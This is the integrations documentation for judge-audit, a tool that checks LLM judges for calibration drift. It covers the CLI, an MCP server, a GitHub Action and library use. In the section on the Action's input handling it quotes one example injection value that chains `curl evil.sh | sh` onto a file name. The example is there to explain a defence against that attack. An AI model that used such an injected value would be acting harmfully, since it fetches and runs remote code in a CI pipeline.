# Integrations

## Install

```bash
pip install kunko-judge-audit            # CLI only, stdlib core
pip install "kunko-judge-audit[mcp]"     # + the MCP server
pip install "kunko-judge-audit[charts]"  # + HTML reports with charts (matplotlib)
```

## CLI

```bash
judge-audit run labels.jsonl --judge simulated            # audit-report.md, audit-result.json, audit-judgments.jsonl
judge-audit check labels.jsonl --judge jev --baseline audit-result.json --max-ece-drift 0.02
judge-audit check labels.jsonl --judge jev --baseline audit-result.json --min-safe-rate 0.05:0.40
```

Every report opens with **"Can I automate this?"**: the **safe automation rate**, the share of the judge's decisions it can take alone at the target error (`--target`, default 5 %; 1, 2, 5 and 10 % as context), with the confidence threshold to deploy, the worst segment and what the rate is valid for ([judges.md § The safe automation rate](judges.md#the-safe-automation-rate)). `--min-safe-rate RISK:SHARE` turns it into a gate: exit `1` when the rate at an error of at most RISK is below SHARE.

Exit codes: `0` ok · `1` drift detected · `2` usage or configuration error. Judges and their environment variables: [judges.md](judges.md). Real vendor runs: [real-audits.md](real-audits.md).

**The gate compares like with like.** `check` refuses (exit `2`, with a message naming what differs) when the baseline measured something else: a different dataset (`run.dataset.sha256_rows`, or `sha256` for baselines written before it existed), a different judge name or model, or a different `n`. An ECE that moved between two datasets says nothing about the judge, so the gate will not pretend it does. Fields the baseline does not declare are not compared — a hand-written `{"ece": …, "accuracy": …}` threshold file still gates. Non-finite numbers (`NaN`, `Infinity`) on either side are refused. When the change is deliberate — a new dataset version, a renamed model — pass `--allow-incompatible` and the comparison runs as before. If both sides recorded a `prompt_sha256` and they differ, the gate warns (on stderr) that the two runs answered different questions, but does not fail: a new prompt is a new measurement, not a drifting judge.

**Which judgments a result was built from.** Beside the dataset's digest (`run.dataset.sha256_rows`), `audit-result.json` records `judgments_sha256`: the sha256 of the judgments its numbers were computed from, in one canonical form, so a judgments file that reproduces every count but differs in any field (a confidence moved by 0.001, a `raw` value) is told apart. The canonical form: each record of `audit-judgments.jsonl` (as written, and as read back), sorted by `idx` then `question`, one per line as `json.dumps(record, sort_keys=True, separators=(",", ":"), ensure_ascii=False)` plus `\n`, the whole UTF-8 encoded; floats in Python's shortest round-trip form, which is the same on 3.10–3.12. `judge_audit.runner.verify_judgments(result, "audit-judgments.jsonl")` returns `None` when the file is the one the result was built from and a reason otherwise; `judgments_digest(records)` and `canonical_judgments(records)` give the digest and the bytes. `judge-audit run` and `scripts/audit_resumable.py` write it; reports regenerated from a checkpoint record the digest of the records read from it. A result written before the field existed still loads; it simply cannot be verified this way.

## Inside the agent's own session (MCP)

```bash
pip install "kunko-judge-audit[mcp]"
claude mcp add judge-audit -- judge-audit-mcp
```

Cursor (`.cursor/mcp.json`) or any stdio MCP client:

```json
{
  "mcpServers": {
    "judge-audit": { "command": "judge-audit-mcp" }
  }
}
```

Tools: `run_audit`, `check_drift`, `list_judges`. The agent can ask *"audit `examples/email-routing/labels.jsonl` with the simulated judge and tell me the zero-error coverage"* and gets back the same numbers the CLI writes — n, accuracy, ECE, reliability bins, accuracy-coverage curve, zero-error coverage, cost, p50/p99 — plus the run provenance (judge, model, backend, dataset sha256) and `ground_truth`: the dataset's [provenance tier](ground-truth.md) next to the accuracy (`GT-1 constructed`, or `GT-0 unknown` with a hint when the file declares none). Or *"has our judge drifted since `baseline.json`?"* → `check_drift` returns `ok`, the failures, the new ECE/accuracy and the tier.

Paths resolve from the directory the server was started in. Results from the simulated judge always carry the `SIMULATED` tag; a judge that is not configured (no API key) comes back as a structured `error`, never as a crashed server. The server makes no network calls of its own — only the ones the judge you chose makes.

## GitHub Action

```yaml
# .github/workflows/judge-audit.yml
permissions:
  contents: read
  pull-requests: write     # only for the sticky PR comment

steps:
  - uses: actions/checkout@v4
  - uses: kunko-ai-labs/judge-audit@v0.4   # or pin the release's commit SHA (see below)
    with:
      labels: audits/labels.jsonl              # the decisions your humans already made
      judge: jev                               # simulated | jev | llm
      mode: check                              # gate on drift vs the baseline; 'run' only reports
      baseline: audits/baseline.json           # audit-result.json of the run you signed off
      max-ece-drift: "0.02"
      max-acc-drop: "0.01"
      target: "0.05"                           # the error rate the safe automation rate is headlined at
      segment-by: "label"                      # label | meta.FIELD | none: name the worst segment
      min-safe-rate: "0.05:0.40"               # fail if the safe automation rate at ≤ 5 % error is below 40 %
      fail-on-drift: "true"                    # 'false' = report, expose the `drift` output, do not fail
      allow-incompatible: "false"              # 'true' = compare even if the baseline measured another dataset/judge/n
      upload-evidence: "false"                 # 'true' = also upload the per-decision judgments as an artifact
      extras: ""                               # pip extras, e.g. "anthropic" or "charts,mcp"
    env:
      AI_GATEWAY_API_KEY: ${{ secrets.AI_GATEWAY_API_KEY }}   # jev; llm uses ANTHROPIC_API_KEY or LLM_*
```

The markdown report lands in the job summary; on pull requests one comment is created and then updated on every push (marker `<!-- judge-audit:<labels> -->`), with the SIMULATED banner whenever the judge is the simulator. The comment opens with the safe automation rate. Outputs: `accuracy`, `ece`, `zero-error-coverage`, `safe-automation-rate` (at the target), `safe-automation-rates` (e.g. `1%=0.0 2%=0.0 5%=0.41 10%=0.7226`), `n`, `drift`, `report-path`, `result-path`. `min-safe-rate`, `target` and `segment-by` are matched against strict patterns before they reach the CLI. The report, the result JSON and the drift verdict are uploaded as a run artifact. The per-decision judgments are written on the runner but **not** uploaded unless you set `upload-evidence: "true"` — those rows contain the decisions themselves, and an artifact is readable by everyone who can read the repository.

**The Action treats its inputs as data.** Every input reaches the shell through `env:` and is used quoted; none is interpolated into a script, where a value like `labels.jsonl; curl evil.sh | sh` would be executed rather than read. `mode` is checked against `run | check` before anything runs, `extras` against a character allowlist, and there is no `eval` anywhere. `tests/test_action_yaml.py` fails the build if an `${{ inputs.* }}` ever reappears inside a `run:` block.

Regenerate the baseline deliberately (`judge-audit run … --json audits/baseline.json`) and review the diff like any other change. This repo's own [`judge-audit.yml`](../.github/workflows/judge-audit.yml) asserts that the Action passes what it should and detects the drift it should — a green run means the gate still works.

### Running third-party code in your CI — what you should check

- **Pin by commit SHA**, not by tag. Tags can move; a SHA cannot. Get the SHA of any release with `gh api repos/kunko-ai-labs/judge-audit/git/ref/tags/v0.4.0 --jq .object.sha` and write `uses: kunko-ai-labs/judge-audit@<that sha>  # v0.4.0`; Dependabot keeps the SHA and the version comment in step. Our own workflows pin every action the same way.
- **What the Action does:** `pip install` of this repository at that SHA, then runs the CLI on your labels file. The only outbound traffic is `pip` and the judge endpoint you configure through the job's `env`; the Action itself reads no secret and executes nothing from your repository.
- **Least privilege:** `contents: read` is enough; add `pull-requests: write` only for the PR comment.
- **Verify what you get:** every release ships Sigstore build provenance (`gh attestation verify` on the artifacts) and the [OpenSSF Scorecard](https://scorecard.dev/viewer/?uri=github.com/kunko-ai-labs/judge-audit) of this repo is public.

## Plain CI step

```yaml
- run: pip install "kunko-judge-audit"
- run: judge-audit check labels.jsonl --judge jev --baseline baseline/audit-result.json --drift drift.json
  env:
    AI_GATEWAY_API_KEY: ${{ secrets.AI_GATEWAY_API_KEY }}
```

Exit `1` fails the job when the judge is less honest than the committed baseline; `--drift` writes the verdict (`{ok, failures, ece, accuracy}`) for anything downstream.

## As a library

```python
from judge_audit import run_audit
from judge_audit.judges.simulated import SimulatedJudge
from judge_audit.runner import load_jsonl

rows = load_jsonl("labels.jsonl")
result = run_audit(SimulatedJudge(rows), rows, labels_path="labels.jsonl")
print(result.ece, result.zero_error, result.run["dataset"]["sha256"])
```

Implement your own judge by subclassing `judge_audit.Judge` — see [judges.md](judges.md#writing-an-adapter).
